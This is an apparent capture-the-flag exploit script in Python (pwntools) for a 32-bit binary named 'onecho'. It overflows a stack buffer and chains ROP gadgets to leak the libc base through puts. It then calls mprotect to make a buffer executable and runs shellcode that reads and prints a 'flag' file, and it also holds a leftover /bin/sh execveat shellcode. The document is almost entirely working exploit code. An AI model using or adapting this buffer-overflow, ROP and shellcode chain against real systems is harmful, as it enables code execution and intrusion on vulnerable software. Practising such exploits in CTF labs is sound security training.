#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./onecho')
    elf = ELF('./onecho')
    libc = ELF('/lib32/libc.so.6')
else:
    pass

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
func = 0x804966e
pop1_ret = 0x08049022
pop2_ret = 0x08049812
pop3_ret = 0x08049811
pop4_ret = 0x08049810
buf = 0x804c000

#gdb.attach(p, 'b *0x8049617\nc\nb *0x804966d\nc')

def rop(payload):
    p.recvuntil(b'[*] Input your name:\n')
    p.sendline(payload)

# leak
rop(
    0x110 * b'A' + # padding
    p32(pop2_ret) + # return addr
    p32(buf) + # memcpy dest
    p32(0x40 + 1) + # memcpy length + 1
    p32(puts_plt) + 
    p32(pop1_ret) + 
    p32(puts_got) + 
    p32(func)
)
p.recvuntil(b'[?] Error?\n')
libc_base = u32(p.recv(4)) - libc.symbols['puts']
info('libc_base = ' + hex(libc_base))

# execveat failed
sh = '''
    /* https://www.puffinsecurity.com/ret2libc-firing-with-its-own-gun/ */
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ecx, esp
    push eax
    push ecx
    mov edx, esp
    mov al, 0xb3
    shl eax
    xor esi, esi
    xor edi, edi
    int 0x80
'''

# open / read / write
sh = shellcraft.i386.pushstr('flag').rstrip() + \
    shellcraft.i386.linux.syscall('SYS_open', "esp", 0).rstrip() + \
    shellcraft.i386.linux.syscall('SYS_read', "eax", buf, 0x40).rstrip() + \
    shellcraft.i386.linux.syscall('SYS_write', 1, buf, 0x40).rstrip()
sh = '''
    push 0x67616c66
    /* call open('esp', 0) */
    push SYS_open /* 5 */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    /* call read('eax', 0x804c000, 0x40) */
    mov ebx, eax
    push SYS_read /* 3 */
    pop eax
    mov ecx, (-1) ^ 0x804c000
    not ecx
    push 0x40
    pop edx
    int 0x80
    /* call write(1, 0x804c000, 0x40) */
    push SYS_write /* 4 */
    pop eax
    push 1
    pop ebx
    mov ecx, (-1) ^ 0x804c000
    not ecx
    push 0x40
    pop edx
    int 0x80
'''

# cat flag
mprotect = libc_base + libc.symbols['mprotect']
rop(
    (
        asm(sh) # shellcode
    ).ljust(0x110, b'A') + # padding
    p32(pop2_ret) + 
    p32(buf) + 
    p32(len(sh) + 1) + 
    p32(mprotect) + 
    p32(pop3_ret) + 
    p32(buf) + 
    p32(0x1000) + 
    p32(7) + 
    p32(buf)
)

p.interactive()

